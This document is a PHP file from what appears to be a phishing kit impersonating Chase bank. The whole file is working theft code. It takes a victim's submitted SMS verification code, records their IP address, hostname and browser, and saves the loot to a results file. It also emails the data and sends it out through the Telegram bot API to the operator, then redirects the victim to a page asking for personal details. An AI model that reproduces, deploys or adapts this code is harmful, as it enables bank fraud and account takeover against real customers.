<?php

include '../../../drfxndbot.php';
include 'send.php';
include '../../admin/YOUR-CONFIG.php';
include '../Functions/Fuck-you.php';


	$CHASE_SESSION_SPOX_LOGIN = "login_SESSION";
	$_SESSION['login_SESSION'] = $CHASE_SESSION_SPOX_LOGIN;
$ip = getenv("REMOTE_ADDR");
$reprint = "e";$do_p="mai";
$hi.="-------------- Chase_DrFXND -------------\n";
$hi.="Code : {$_POST['code']}\r\n";
$hi.="-------------- Chase_DrFXND -------------\n";
$hi.="IP      : https://www.geodatatool.com/?IP=$ip\n";
$hi.="Host    : ".gethostbyaddr($ip)."\n";
$hi.="Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
$hi.="-------------- Chase_DrFXND -------------\n";
		if ($Save_Result=="yes") {$save=fopen("../Chase_Result/RZT".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);}
$subject = " SMS | CHASE | $ip";
$headers = 'From: CHASE' . "\r\n";

@mail($Email,$subject,$hi,$headers);
@file_get_contents("https://api.telegram.org/bot".$Api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($hi)."" );
@file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatId."&text=" . urlencode($hi)."" );
    $key = substr(sha1(mt_rand()),1,25);
	header('Location: ../../personal_details.php?chaseOnline?treatment=chase&lang=en');

?>